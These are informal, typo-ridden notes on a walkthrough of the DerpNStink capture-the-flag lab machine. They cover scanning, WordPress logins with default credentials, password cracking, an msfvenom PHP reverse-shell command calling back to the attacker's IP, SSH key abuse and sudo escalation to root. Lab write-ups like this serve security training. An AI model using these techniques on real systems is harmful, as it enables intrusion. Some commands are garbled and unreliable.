# The DerpNStink CTF
Welcome! Today Jack is going to walkthrough Derp N Stink CTF to break into another machine with a different objective. 
## Walkthrough
- First, we check out the description of the CTF, we found that he is dealing with a boot2root ubuntu based virtual machine, with DHCP setting 
- Goal is remotely attack the VM and find  all 4 flags to destroy the machine
- The he used terminal to find out ip adress through IP/If Config, found out that is own IP adress is 192.168.170.128
- Then, he used command: nmap -sS 192.168.170.* (or 0/24) to get all the IP adress on this network that he is in to find the vurnerable machine
- The -sS also gave him the port, it give him detail of 3 port ssh(22), ftp(21), http(80), all of them are open. 
- There is also another IP adress 192.168.170.254 which probably the machine of target
- Which he used the http port and type in the IP adress of 192.168.170.131, it gives him a website that include a image, background and a purple words
- Then Jack check the sources code (element), he found the html code, in which he found flag1 when he expand it. 
- Then he check for robot.txt of the IP adress, but there is nothing
- Then he ran Dirbuster, on the http ip adress and find the wordlist to applied on the website. 
- Which it create two new directorues and a word press directories of the same website, 
- Jack found the wordpress of the DerpNStink CTF, which give detail of the page 
- So, he open wordpress and log in to it. Username is admin (using the tool of wpscan, give vunerability and username list), or hydra (dictonary based) and metasploit, or burpsuite.
- So, its admin for user and admin for pass and got into wordpress.
- Inside wordpress there is a menu to create blog, and the ability to give permission on certain bit of the site to other user.
- Jack now had access to all the slideshow, in which he is definitely not the admin. 
- Jack is back to use wpscan, and he used the url scan of the website. 
- He found data on the vunerability list, in which each vunerability to explain what it the vunerability is, how to break into the vunerability, and date of fixed. 
- So, Jack file out detail on the vunerability on exploit database. 
- And he download the script to break in the vunerability
- Back on terminal, he used the command: msfvenom -p php/meterpreter_reverse-tcp-LHOST = 192.168.170.128 LPORT = 4444 -f raw . shell.php, to reverse engineer the webite with shell.
- After that, he is running the exploit and the python command to upload the shell to gain access to the machine. His payload ios a reverse tcp shell
- After gaining access to the machine, check whoami, found two folder. One being stinky
- Then he check all the website file through weblog ls, this give him acess to IP file, password and userfile. Password might be encoded so use hashid.
- Exploit is using the vunerability, payload is the tool of to exploitation
- HE figured out that htere rwould be another user on WPscan as he can't gain access opn the first one
- Once he ran the weblog, he found the weblog to the website which has the config file, tranfered that to his own machine and log in to wordpress. 
- This give he info on the another account, with the password in hash. He used hashcat to decifer it and move the hash into a file. 
- Ran that file into the rockyou word list
- Password is "wedgie57", and login into unclestinky and found flag2
- Now knowing that ssh is also open for thie vunerable machine, 
- He use ftp to get into the computer, found a file called derp.txt. The file has text and clue to another file
- He found a private key for the ssh, its a rsa cipher. 
- So he used ssh -i -key.txt to the machine. Permission is to high so he change the permission on the machine.
- Now, he is now stinky, he procedd to check all the file. Found a pcap file and flag.txt, which has flag 3.
- Jack now proceed to break the pcap file, in which he tried to push the file to his own machine by netcat. 
- Back on wireshark, he looking on the conversation on stinky. Which also show info on mrderp user on wordpress, found the password.
- Now he log into mrderp, scan for file, ran sudo -l  on mrderp, in which he found the code (ALL) /home/mrderp/binaries/derpy*
- changemod the derp.sh to derp, gain access to root through sudo, found the file of flag4.
